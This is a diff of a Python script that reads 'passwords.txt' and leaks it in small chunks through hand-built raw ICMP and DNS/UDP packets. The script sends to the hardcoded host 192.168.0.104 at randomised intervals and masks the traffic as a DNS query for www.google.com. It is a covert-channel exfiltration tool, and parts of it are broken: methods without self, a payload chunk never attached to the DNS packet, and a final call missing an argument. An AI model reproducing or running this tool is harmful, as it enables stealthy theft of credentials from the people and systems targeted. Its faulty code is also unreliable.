@@ -2,6 +2,8 @@ import struct
 import socket
 import binascii
 import random
+import math
+import time
 
 startByte = 0
 chunkLength = 2
@@ -12,8 +14,8 @@ ICMP_ECHO_REPLY = 0
 
 DNS_REQUEST = 0
 
-ICMP_CODE = socket.getprotobyname('icmp')
-UDP_CODE = socket.getprotobyname('udp')
+ICMP_PROTOCOL = socket.getprotobyname('icmp')
+UDP_PROTOCOL = socket.getprotobyname('udp')
 
 class ICMPPacket:
     def __init__(self, type, code):
@@ -23,9 +25,10 @@ class ICMPPacket:
     def computeChecksum():
         return
     
-    def getHeader(self, id):
+    def getHeader(self):
         # Type (8), code(8), checksum(16), id(16), sequence(16)
-        icmpHeader = struct.pack("bbHHh", self.type, self.code, 0, id, 0)
+        packetId = int((id(self) * random.random()) % 65535)
+        icmpHeader = struct.pack("bbHHh", self.type, self.code, 0, packetId, 0)
         return icmpHeader
 
     def fill():
@@ -41,13 +44,14 @@ class DNSPacket:
     def computeChecksum():
         return
         
-    def getHeader(self, id):
+    def getHeader(self):
         # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
         # All flags are 0 so we can just use an unsigned short (16 bytes) of 0
         # DNS uses UDP so create UDP header first
-    
+
+        packetId = int((id(self) * random.random()) % 65535)
         udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(40), 0)
-        dnsHeader = struct.pack("HHHHHH", socket.htons(id), 0, socket.htons(1), 0, 0, 0)
+        dnsHeader = struct.pack("HHHHHH", socket.htons(packetId), 0, socket.htons(1), 0, 0, 0)
         return udpHeader + dnsHeader
 
     def fill():
@@ -58,20 +62,33 @@ def init():
     global exfilBytes
     startByte = 0
     exfilBytes = readFile("passwords.txt", "rb")
+    loop()
+
+def loop():
+    maxDelay = 5
+    delay = random.random() * maxDelay
+    while(True):
+        if startByte < (len(exfilBytes) - 1):
+            sendNext("192.168.0.104", UDP_PROTOCOL)
+        else:
+            break
+        time.sleep(delay)
+        delay = math.floor(random.random() * maxDelay)
+    return
     
-def createICMPPacket(id):
-    icmpPacket = ICMPPacket()
-    icmpHeader = icmpPacket.getHeader(1)
+def createICMPPacket():
+    icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0)
+    icmpHeader = icmpPacket.getHeader()
     data = getNextChunk(startByte, chunkLength)
     
     return icmpHeader + data
 
-def createDNSPacket(id):
+def createDNSPacket():
     dnsPacket = DNSPacket(0, 0)
-    dnsUdpHeader = dnsPacket.getHeader(1)
-    a = stringToBin(stringToDNSQuery("www.google.com"))
+    dnsUdpHeader = dnsPacket.getHeader()
+    questionDomain = stringToBin(stringToDNSQuery("www.google.com"))
     data = struct.pack("HH", socket.htons(1), socket.htons(1))
-    return dnsUdpHeader + a + data
+    return dnsUdpHeader + questionDomain + data
 
 def stringToDNSQuery(s):
     labels = s.split(".")
@@ -80,6 +97,7 @@ def stringToDNSQuery(s):
         output += str(len(labels[i])) + labels[i]
     output += '0' # Add labels terminator
     return output
+
 def getNextChunk(sb, cl):
     global startByte
     chunk = b''
@@ -129,7 +147,7 @@ def readFile(name, mode):
     finally:
         f.close()
     return fileBytes        
-def do_one(dest_addr, timeout=1):
+def sendNext(dest_addr, code, timeout=1):
     """
     Sends one ping to the given "dest_addr" which can be an ip or hostname.
     "timeout" can be any integer or float except negatives and zero.
@@ -139,7 +157,7 @@ def do_one(dest_addr, timeout=1):
 
     """
     try:
-        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, UDP_CODE)
+        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, code)
     except socket.error as e:
         #if e.errno in ERROR_DESCR:
             # Operation not permitted
@@ -151,9 +169,8 @@ def do_one(dest_addr, timeout=1):
         return
     # Maximum for an unsigned short int c object counts to 65535 so
     # we have to sure that our packet id is not greater than that.
-    packet_id = int((id(timeout) * random.random()) % 65535)
-    #packet = createPacket(packet_id)
-    packet = createDNSPacket(0)
+    #packet = createICMPPacket()
+    packet = createDNSPacket()
     while packet:
         # The icmp protocol does not use a port, but the function
         # below expects it, so we just give it a dummy port.
@@ -165,5 +182,5 @@ def do_one(dest_addr, timeout=1):
     return
 
 init()
-do_one("8.8.8.8")
+sendNext("8.8.8.8")
     
